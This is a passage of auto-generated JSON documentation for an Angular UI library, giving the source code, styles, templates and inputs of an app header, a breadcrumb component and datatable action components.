      "sourceCode": "import { ChangeDetectionStrategy, ChangeDetectorRef, Component, Input, OnInit, ViewEncapsulation } from '@angular/core';\nimport { Breadcrumb } from '../sto-breadcrumbs/breadcrumb';\nimport { MatMenuPanel } from '@angular/material/menu';\nimport { StoThemeService } from '../theme/theme.service';\nimport { typography, TypographyName } from '../theme/models';\nimport { fromEvent, Observable } from 'rxjs';\nimport { filter, map, take } from 'rxjs/operators';\nimport { BreakpointObserver } from '@angular/cdk/layout';\n\n/**\n * StoAppHeaderComponent is used to create an App header toolbar with a common look / feel across our portfolio\n *\n * @example\n *\n * <sto-app-header [homeBreadCrumbConfig]=\"{ command: () => openDrawer() }\"\n *    [breadCrumbs]=\"[{ label: 'Planning', segment: 'planning' }]\">\n * </sto-app-header>\n */\n@Component({\n  selector: 'sto-app-header',\n  templateUrl: './sto-app-header.component.html',\n  styleUrls: [ './sto-app-header.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class StoAppHeaderComponent implements OnInit {\n  /**\n   * testEnvironment tells the header whether or not to style itself defining a test-environment\n   */\n  @Input()\n  testEnvironment: boolean;\n  /**\n   * If {@link testEnvironment} is true, this name is printed out centered on the header\n   */\n  @Input()\n  environmentName: string;\n  /**\n   * Input for user information menu.\n   */\n  @Input()\n  userMenu: MatMenuPanel;\n  /**\n   * Configuration that determines what to do when clicking the top-level menu icon\n   */\n  @Input()\n  homeBreadCrumbConfig: { command: () => void };\n  /**\n   * Configuration used to print out the relevant application breadcrumbs.\n   */\n  @Input()\n  breadCrumbs: Breadcrumb[];\n\n  public darkmode$: Observable<boolean>;\n  public isSmall$: Observable<boolean>;\n  public menuOpen: boolean;\n\n  constructor(\n    private themeService: StoThemeService,\n    private breakpointObserver: BreakpointObserver,\n    private cdr: ChangeDetectorRef\n  ) {\n  }\n\n  toggleTheme() {\n    const themeName = document.body.classList.contains('sto-dark-theme') ? 'light' : 'dark';\n    this.themeService.setTheme(themeName);\n  }\n\n  toggleTypography(className?: string) {\n    const small = className === typography.get('small');\n    const large = className === typography.get('large');\n    const typographyName: TypographyName = small ? 'small' : large ? 'large' : 'medium';\n    this.themeService.setTypography(typographyName);\n  }\n\n  toggleMenu(event: MouseEvent) {\n    this.menuOpen = !this.menuOpen;\n    if ( this.menuOpen ) {\n      fromEvent(document, 'click')\n        .pipe(\n          filter(e => e !== event),\n          filter(e => {\n            const t = e.target as HTMLElement;\n            if ( !t || !t.parentElement ) {\n              return true;\n            }\n            let parent = t;\n            let iterations = 0;\n            while ( parent.parentElement && iterations < 5 ) {\n              if ( parent.classList.contains('mat-menu-trigger') ) {\n                return false;\n              }\n              iterations = iterations + 1;\n              parent = parent?.parentElement;\n            }\n            return true;\n          }),\n          take(1)\n        )\n        .subscribe(() => {\n          this.menuOpen = false;\n          this.cdr.markForCheck();\n        });\n    }\n  }\n\n  ngOnInit(): void {\n    this.darkmode$ = this.themeService.getActiveTheme()\n      .pipe(map(theme => theme && theme.name === 'dark'));\n    this.isSmall$ = this.breakpointObserver.observe([ '(max-width: 500px)' ]).pipe(map(r => r.matches));\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": "@use '@angular/material' as mat;\n\n.sto-header {\n  // @include mat.elevation(3);\n  border-bottom: 1px solid;\n\n  display: flex;\n  flex: auto;\n  flex-direction: row;\n  align-items: center;\n  position: fixed;\n  top: 0;\n  width: 100%;\n  z-index: 50;\n\n  .sto-header__actions mat-icon {\n    margin: auto;\n  }\n\n  &__form {\n    margin: 0 40px;\n    width: 50%;\n    display: flex;\n  }\n\n  &__environment {\n    position: absolute;\n    width: 100%;\n    left: 0;\n    top: 0;\n    display: flex;\n    pointer-events: none;\n\n    &--label {\n      padding: 4px 8px;\n      text-transform: uppercase;\n      white-space: nowrap;\n      width: fit-content;\n      border-radius: 2px;\n      position: relative;\n      margin: auto;\n    }\n\n  }\n\n  .small-toggle {\n    margin-right: 6px;\n  }\n\n  &__actions {\n    display: flex;\n    align-items: center;\n    margin-right: 8px;\n\n    &--small {\n      flex-direction: column;\n      width: 48px;\n      height: auto;\n      //max-height: 0;\n      transform: scale(0);\n      opacity: 0;\n      transform-origin: top right;\n      overflow: hidden;\n      position: absolute;\n      right: -4px;\n      top: 50px;\n      z-index: 100;\n      border-radius: 2px;\n      transition: opacity 200ms linear;\n      @include mat.elevation(4);\n\n      button {\n        margin-left: 0 !important;\n        margin-right: 0 !important;\n      }\n\n      &--open {\n        transform: scale(1);\n        opacity: 1;\n        //height: auto;\n        //max-height: 200px;\n      }\n    }\n\n    button {\n      margin: 4px;\n\n      &:first-of-type {\n        margin-left: 0;\n      }\n\n      &:last-of-type {\n        margin-right: 0;\n      }\n    }\n  }\n}\n\n\n.mat-typography.sto-l-typography .sto-header__form .sto-form__field .mat-form-field-flex .mat-form-field-label {\n  top: 0.12em;\n}\n.mat-typography.sto-sm-typography .sto-header__form .sto-form__field.mat-form-field{\n  line-height: 12px;\n  .mat-form-field-flex .mat-form-field-label {\n    top: 0.36em;\n  }\n}\n\n.sto-header__form{\n  .sto-form__field {\n    margin-bottom: -40px;\n\n    .mat-form-field-flex {\n      height: 32px;\n      .mat-form-field-prefix{\n        margin-right: 8px;\n      }\n\n      .mat-form-field-infix {\n        border: 0 !important;\n        margin: 0 !important;\n        padding: 4px 0 0 !important;\n\n        .mat-form-field-label{\n          top: 0.22em;\n        }\n      }\n    }\n    .mat-form-field-label-wrapper {\n      top: 0;\n      padding: 0;\n    }\n  }\n}\n",
          "styleUrl": "./sto-app-header.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "themeService",
            "type": "StoThemeService",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "breakpointObserver",
            "type": "BreakpointObserver",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 55,
        "jsdoctags": [
          {
            "name": "themeService",
            "type": "StoThemeService",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "breakpointObserver",
            "type": "BreakpointObserver",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
        "OnInit"
      ],
      "readme": "<h3 id=\"stoappheader\">StoAppHeader</h3>\n<p>StoAppHeader is used as a header navigation bar, and in combination with StoBreadCrumbs, also allows you to have a trail of your navigation. </p>\n<p>The breadcrumb trail can be limitless in length, but current practice dictates that it only be 2 segments (Application name / Application section)</p>\n<h5 id=\"usage\">Usage</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-app-header [homeBreadCrumbConfig]=&quot;homeInfo&quot;\n[breadCrumbs]=&quot;[...]&quot;\n[testEnvironment]=&quot;true|false&quot;\nenvironmentName=&quot;Acceptance&quot;&gt;\nOther content can be placed here via projection\n&lt;/sto-app-header&gt;</code></pre></div><h5 id=\"inputs\">Inputs</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">&#64;Input()\nhomeBreadCrumbConfig: {command: () =&gt; void};</code></pre></div><div><pre class=\"line-numbers\"><code class=\"language-javascript\">&#64;Input()\nbreadCrumbs: Breadcrumb[];</code></pre></div><div><pre class=\"line-numbers\"><code class=\"language-javascript\">&#64;Input()\ntestEnvironment: boolean; // Should the navbar display as testenvironment</code></pre></div><div><pre class=\"line-numbers\"><code class=\"language-javascript\">&#64;Input()\nenvironmentName: string; // Name to be displayed as the active env (e.g acceptance, Systemtest etc)</code></pre></div><h5 id=\"additional-values\">Additional values</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">interface Breadcrumb {\n    label: string;\n    command?: Function;\n    segment?: string;\n}</code></pre></div>",
      "templateData": "<div class=\"sto-header\"\n     [class.sto-header--test-environment]=\"testEnvironment\">\n  <sto-breadcrumbs [home]=\"homeBreadCrumbConfig\"\n                   [model]=\"breadCrumbs\"></sto-breadcrumbs>\n  <ng-content select=\".sto-header__form\">\n  </ng-content>\n  <div class=\"sto-header__environment\"\n       *ngIf=\"testEnvironment && environmentName && (isSmall$ | async) === false\">\n    <div class=\"sto-header__environment--label\">\n      {{environmentName}}\n    </div>\n  </div>\n  <span class=\"spacer\"></span>\n  <button mat-icon-button\n          class=\"small-toggle\"\n          *ngIf=\"isSmall$ | async\"\n          (click)=\"toggleMenu($event)\">\n    <mat-icon>more_vert</mat-icon>\n  </button>\n  <div class=\"sto-header__actions\"\n       [class.sto-header__actions--small--open]=\"menuOpen\"\n       [class.sto-header__actions--small]=\"isSmall$ | async\">\n    <ng-content></ng-content>\n    <button mat-icon-button\n            title=\"Accessibility\"\n            [matMenuTriggerFor]=\"menu\">\n      <mat-icon>accessibility</mat-icon>\n    </button>\n    <button mat-icon-button\n            title=\"Account\"\n            *ngIf=\"userMenu\"\n            [matMenuTriggerFor]=\"userMenu\">\n      <mat-icon>account_circle</mat-icon>\n    </button>\n  </div>\n</div>\n\n<mat-menu #menu=\"matMenu\"\n          [yPosition]=\"(isSmall$ | async) ? 'above' : 'below'\">\n  <button mat-menu-item\n          class=\"dense\"\n          (click)=\"toggleTheme()\">\n    <mat-icon>{{ (darkmode$ | async) ? 'wb_sunny' : 'nights_stay' }}</mat-icon>\n    {{(darkmode$ | async) ? 'Disable' : 'Enable'}} night mode\n  </button>\n  <button mat-menu-item\n          class=\"dense\"\n          [matMenuTriggerFor]=\"fontMenu\">\n    <mat-icon>format_size</mat-icon>\n    Font size\n  </button>\n</mat-menu>\n<mat-menu #fontMenu=\"matMenu\">\n  <button mat-menu-item\n          class=\"dense\"\n          style=\"font-size: 10px\"\n          (click)=\"toggleTypography('sto-sm-typography')\">\n    Smaller\n  </button>\n  <button mat-menu-item\n          class=\"dense\"\n          style=\"font-size: 13px\"\n          (click)=\"toggleTypography()\">\n    Regular\n  </button>\n  <button mat-menu-item\n          class=\"dense\"\n          style=\"font-size: 16px\"\n          (click)=\"toggleTypography('sto-l-typography')\">\n    Larger\n  </button>\n</mat-menu>\n"
    },
    {
      "name": "StoBreadcrumbsComponent",
      "id": "component-StoBreadcrumbsComponent-478213d5ffc94048a8ccd400f44058cbb5a727ebf07fb4eeda519bb41c01ac0d363a8931dcf1554dc74d8652e901bc317e52a82dd2f53e888346bf1c3e091a20",
      "file": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.component.ts",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-breadcrumbs",
      "styleUrls": [
        "./sto-breadcrumbs.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-breadcrumbs.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "home",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nAn object that can contain a url segment or a command.\n",
          "description": "<p>An object that can contain a url segment or a command.</p>\n",
          "line": 45,
          "type": "any",
          "decorators": []
        },
        {
          "name": "homeicon",
          "defaultValue": "'apps'",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 38,
          "type": "string",
          "decorators": []
        },
        {
          "name": "homeIcon",
          "defaultValue": "'home'",
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "pos": 1475,
              "end": 1550,
              "flags": 4227072,
              "modifierFlagsCache": 0,
              "transformFlags": 0,
              "kind": 325,
              "tagName": {
                "pos": 1476,
                "end": 1486,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "DEPRECATED"
              },
              "comment": "<p>The material icon that is show top left\n {string}</p>\n"
            }
          ],
          "line": 60,
          "type": "string",
          "decorators": []
        },
        {
          "name": "model",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nA list of items which can be a url segment { segment : 'inventory'} or a command {command: () => {}} .\n",
          "description": "<p>A list of items which can be a url segment { segment : &#39;inventory&#39;} or a command {command: () =&gt; {}} .</p>\n",
          "line": 22,
          "type": "any[]",
          "decorators": []
        },
        {
          "name": "style",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nDEPRECATED\n",
          "description": "<p>DEPRECATED</p>\n",
          "line": 50,
          "type": "any",
          "decorators": []
        },
        {
          "name": "styleClass",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nDEPRECATED\n",
          "description": "<p>DEPRECATED</p>\n",
          "line": 54,
          "type": "string",
          "decorators": []
        },
        {
          "name": "svgIcon",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 40,
          "type": "boolean",
          "decorators": []
        }
      ],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "_model",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "any[]",
          "optional": false,
          "description": "",
          "line": 34,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "css",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 32,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.sto-breadcrumb'"
            }
          ]
        },
        {
          "name": "iconConfig",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "literal type",
          "optional": false,
          "description": "",
          "line": 61,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "title",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 35,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "itemClick",
          "args": [
            {
              "name": "event",
              "type": "Event",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "item",
              "type": "Breadcrumb",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 67,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "Event",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "item",
              "type": "Breadcrumb",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 102,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "onHomeClick",
          "args": [
            {
              "name": "event",
              "type": "Event",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 96,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "Event",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class.sto-breadcrumb",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 32,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "<p>Breadcrumbs is the navigation scheme that reveals the user&#39;s location on the web application.\nIt shows both a home icon and the path that could be an url or a command/function (e.g open a drawer, popup etc).</p>\n",
      "rawdescription": "\n\nBreadcrumbs is the navigation scheme that reveals the user's location on the web application.\nIt shows both a home icon and the path that could be an url or a command/function (e.g open a drawer, popup etc).\n",
      "type": "component",
      "sourceCode": "import { Component, EventEmitter, HostBinding, Inject, Input, OnDestroy, Optional, ViewEncapsulation } from '@angular/core';\nimport { Router } from '@angular/router';\n\nimport { Breadcrumb, BreadcrumbConfig, NAVIGATION_HOME_ICON } from './breadcrumb';\n\n/**\n * Breadcrumbs is the navigation scheme that reveals the user's location on the web application.\n * It shows both a home icon and the path that could be an url or a command/function (e.g open a drawer, popup etc).\n */\n@Component({\n  selector: 'sto-breadcrumbs',\n  templateUrl: './sto-breadcrumbs.component.html',\n  styleUrls: [ './sto-breadcrumbs.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n})\nexport class StoBreadcrumbsComponent implements OnDestroy {\n\n  /**\n   * A list of items which can be a url segment { segment : 'inventory'} or a command {command: () => {}} .\n   */\n  @Input() get model(): any[] {\n    return this._model;\n  }\n\n  set model(model: any[]) {\n    this.title = ( model || [] ).map(e => e.label || '').join(' / ');\n    this._model = model;\n  }\n\n  @HostBinding('class.sto-breadcrumb')\n  css = true;\n\n  private _model: any[];\n  public title: string;\n\n  @Input()\n  homeicon = 'apps';\n  @Input()\n  svgIcon = false;\n\n  /**\n   * An object that can contain a url segment or a command.\n   */\n  @Input() home: any;\n\n  /**\n   * DEPRECATED\n   */\n  @Input() style: any;\n  /**\n   * DEPRECATED\n   */\n  @Input() styleClass: string;\n  /**\n   * @DEPRECATED\n   * The material icon that is show top left\n   *  {string}\n   */\n  @Input() homeIcon = 'home';\n  public iconConfig: { icon?: string; svgIcon?: string; text?: string; };\n\n  constructor(private router: Router, @Inject(NAVIGATION_HOME_ICON) @Optional() iconConfig: BreadcrumbConfig) {\n    this.iconConfig = iconConfig || { icon: 'apps' };\n  }\n\n  itemClick(event: Event, item: Breadcrumb) {\n    if ( !item ) {\n      return;\n    }\n    if ( item.disabled ) {\n      event.preventDefault();\n      return;\n    }\n\n    if ( !item.url ) {\n      event.preventDefault();\n    }\n\n    if ( item.command ) {\n      if ( !item.eventEmitter ) {\n        item.eventEmitter = new EventEmitter();\n        item.eventEmitter.subscribe(item.command);\n      }\n\n      item.eventEmitter.emit({\n        originalEvent: event,\n        item\n      });\n    } else if ( item.segment ) {\n      this.router.navigate([ item.segment ], { queryParamsHandling: 'preserve' })\n        .catch(console.error);\n    }\n  }\n\n  onHomeClick(event: Event) {\n    if ( this.home ) {\n      this.itemClick(event, this.home);\n    }\n  }\n\n  ngOnDestroy() {\n    if ( this.model ) {\n      for ( const item of this.model ) {\n        if ( item.eventEmitter ) {\n          item.eventEmitter.unsubscribe();\n        }\n      }\n    }\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ".sto-breadcrumb {\n  display: flex;\n  align-items: center;\n  justify-content: left;\n  font-weight: 500;\n  overflow: hidden;\n\n  &__home {\n    min-width: 52px;\n    padding-left: 4px;\n    justify-content: space-around;\n    display: flex;\n    align-items: center;\n    cursor: pointer;\n\n    &__title {\n      margin-right: 16px;\n    }\n\n    &__icon {\n      margin: auto 16px;\n    }\n  }\n\n  &__list {\n    margin: 0;\n    padding-left: 8px;\n    white-space: nowrap;\n    overflow: hidden;\n    display: inline;\n    align-items: center;\n    flex: 0 1 auto;\n    text-overflow: ellipsis;\n\n    .separator {\n      padding: 0 8px;\n      font-weight: 400;\n    }\n\n    &__item {\n\n      font-weight: 500;\n\n\n      cursor: pointer;\n      text-decoration: none;\n\n      &--last {\n        cursor: default;\n      }\n    }\n  }\n}\n\n",
          "styleUrl": "./sto-breadcrumbs.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "router",
            "type": "Router",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "iconConfig",
            "type": "BreadcrumbConfig",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 61,
        "jsdoctags": [
          {
            "name": "router",
            "type": "Router",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "iconConfig",
            "type": "BreadcrumbConfig",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
        "OnDestroy"
      ],
      "accessors": {
        "model": {
          "name": "model",
          "setSignature": {
            "name": "model",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "model",
                "type": "any[]",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 26,
            "jsdoctags": [
              {
                "name": "model",
                "type": "any[]",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "model",
            "type": "[]",
            "returnType": "any[]",
            "line": 22,
            "rawdescription": "\n\nA list of items which can be a url segment { segment : 'inventory'} or a command {command: () => {}} .\n",
            "description": "<p>A list of items which can be a url segment { segment : &#39;inventory&#39;} or a command {command: () =&gt; {}} .</p>\n"
          }
        }
      },
      "readme": "<h4 id=\"stobreadcrumbs\">StoBreadCrumbs</h4>\n<p>Breadcrumbs is the navigation scheme that reveals the user&#39;s location on the web application.\nIt shows both a home icon and the path that could be an url or a command/function (e.g open a drawer, popup etc).</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-breadcrumbs [home]=&quot;{command = () =&gt; {...}&quot; [model]=&quot;[{label: &#39;Home&#39;, segment: &#39;home&#39;}, {label: &#39;Inventory&#39;, segment: &#39;inventory&#39;}]&quot;&gt;&lt;/sto-breadcrumbs&gt;</code></pre></div><p>#####model\nA list of items which can be a url segment { segment : &#39;inventory&#39;} or a command {command: () =&gt; {}} .</p>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">[\n   {label: &quot;IM - OPS&quot;, command: () =&gt; {...}},\n   {label: &quot;Inventory overview&quot;, segment: &quot;overview&quot;}\n]</code></pre></div><p>#####home\nAn object that can contain a url segment or a command.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">{\n    command: () =&gt; {\n      this.store.dispatch(new SwitchNavigationMenuAction(&#39;left&#39;));\n      this.store.dispatch(new OpenNavigationAction(true));\n    }\n  }</code></pre></div>",
      "templateData": "<div class=\"sto-breadcrumb__home\"\n     (click)=\"itemClick($event, home)\">\n  <mat-icon class=\"sto-breadcrumb__home__icon\"\n            *ngIf=\"iconConfig.svgIcon\"\n            [svgIcon]=\"iconConfig.svgIcon\">\n  </mat-icon>\n  <mat-icon class=\"sto-breadcrumb__home__icon\"\n            *ngIf=\"!iconConfig.svgIcon\">{{ iconConfig.icon }}\n  </mat-icon>\n  <span class=\"sto-breadcrumb__home__title\"\n        *ngIf=\"iconConfig.text\">{{iconConfig.text}}</span>\n</div>\n<div class=\"sto-breadcrumb__list\"\n     [title]=\"title\"\n     style=\"position: relative\">\n  <ng-container *ngFor=\"let item of model; let index = index; let last = last\">\n    <a class=\"sto-breadcrumb__list__item sto-breadcrumb__list__item__link\"\n       *ngIf=\"item.url\"\n       [href]=\"item.url\"\n       [title]=\"item.label\">\n      {{ item.label}}\n    </a>\n    <a class=\"sto-breadcrumb__list__item sto-breadcrumb__list__item__link\"\n       *ngIf=\"!item.url && item.segment\"\n       [routerLink]=\"item.segment\"\n       [title]=\"item.label\">\n      {{ item.label}}\n    </a>\n    <a class=\"sto-breadcrumb__list__item sto-breadcrumb__list__item__link\"\n       *ngIf=\"!item.url && !item.segment\"\n       [title]=\"item.label\"\n       (click)=\"itemClick($event, item)\">\n      {{ item.label}}\n    </a>\n    <span class=\"separator\"\n          *ngIf=\"!last\"> /\n    </span>\n  </ng-container>\n</div>\n"
    },
    {
      "name": "StoDatatableActionsComponent",
      "id": "component-StoDatatableActionsComponent-d67a21c5a7fd083c95d5f9794d091d0e398a139e2672890f6f73d3c6e3572b2eb036f9e8a7f76cce88a957c50dd6206bbc225e28dd292eed0403ed881a34ff4d",
      "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-datatable-actions",
      "styleUrls": [
        "./sto-datatable-actions.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-datatable-actions.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "height",
          "defaultValue": "40",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 14,
          "type": "number",
          "decorators": []
        }
      ],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "getClass",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 11,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.sto-mdl-table__actions'"
            }
          ]
        }
      ],
      "methodsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class.sto-mdl-table__actions",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 11,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Component, HostBinding, Input } from '@angular/core';\n\n@Component({\n  selector: 'sto-datatable-actions',\n  templateUrl: './sto-datatable-actions.component.html',\n  styleUrls: [ './sto-datatable-actions.component.scss' ],\n})\n\nexport class StoDatatableActionsComponent {\n  @HostBinding('class.sto-mdl-table__actions')\n  getClass = true;\n  @HostBinding('style.height.px')\n  @Input()\n  height = 40;\n\n}\n\n@Component({\n  selector: 'sto-datatable-actions-left',\n  template: `\n    <ng-content></ng-content>`\n})\nexport class StoDataTableActionsLeftComponent {\n  @HostBinding('class.sto-mdl-table__actions__left')\n  getClass = true;\n}\n\n@Component({\n  selector: 'sto-datatable-actions-right',\n  template: `\n    <ng-content></ng-content>`\n})\nexport class StoDataTableActionsRightComponent {\n  @HostBinding('class.sto-mdl-table__actions__right')\n  getClass = true;\n}\n\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": "",
          "styleUrl": "./sto-datatable-actions.component.scss"
        }
      ],
      "stylesData": "",
      "templateData": "<ng-content select=\"sto-datatable-actions-left\"></ng-content>\n<ng-content select=\"sto-datatable-actions-right\"></ng-content>\n"
    },
    {
      "name": "StoDataTableActionsLeftComponent",
      "id": "component-StoDataTableActionsLeftComponent-d67a21c5a7fd083c95d5f9794d091d0e398a139e2672890f6f73d3c6e3572b2eb036f9e8a7f76cce88a957c50dd6206bbc225e28dd292eed0403ed881a34ff4d",
      "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-datatable-actions-left",
      "styleUrls": [],
      "styles": [],
      "template": "<ng-content></ng-content>",
      "templateUrl": [],
      "viewProviders": [],
      "inputsClass": [],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "getClass",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 25,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.sto-mdl-table__actions__left'"
            }
          ]
        }
      ],
      "methodsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class.sto-mdl-table__actions__left",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 25,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Component, HostBinding, Input } from '@angular/core';\n\n@Component({\n  selector: 'sto-datatable-actions',\n  templateUrl: './sto-datatable-actions.component.html',\n  styleUrls: [ './sto-datatable-actions.component.scss' ],\n})\n\nexport class StoDatatableActionsComponent {\n  @HostBinding('class.sto-mdl-table__actions')\n  getClass = true;\n  @HostBinding('style.height.px')\n  @Input()\n  height = 40;\n\n}\n\n@Component({\n  selector: 'sto-datatable-actions-left',\n  template: `\n    <ng-content></ng-content>`\n})\nexport class StoDataTableActionsLeftComponent {\n  @HostBinding('class.sto-mdl-table__actions__left')\n  getClass = true;\n}\n\n@Component({\n  selector: 'sto-datatable-actions-right',\n  template: `\n    <ng-content></ng-content>`\n})\nexport class StoDataTableActionsRightComponent {\n  @HostBinding('class.sto-mdl-table__actions__right')\n  getClass = true;\n}\n\n",
      "assetsDirs": [],
      "styleUrlsData": "",
      "stylesData": ""
    },
    {
      "name": "StoDataTableActionsRightComponent",
      "id": "component-StoDataTableActionsRightComponent-d67a21c5a7fd083c95d5f9794d091d0e398a139e2672890f6f73d3c6e3572b2eb036f9e8a7f76cce88a957c50dd6206bbc225e28dd292eed0403ed881a34ff4d",
      "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-datatable-actions-right",
      "styleUrls": [],
      "styles": [],
      "template": "<ng-content></ng-content>",
      "templateUrl": [],
      "viewProviders": [],
      "inputsClass": [],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "getClass",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 35,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.sto-mdl-table__actions__right'"
            }
          ]
        }
      ],
      "methodsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class.sto-mdl-table__actions__right",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 35,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
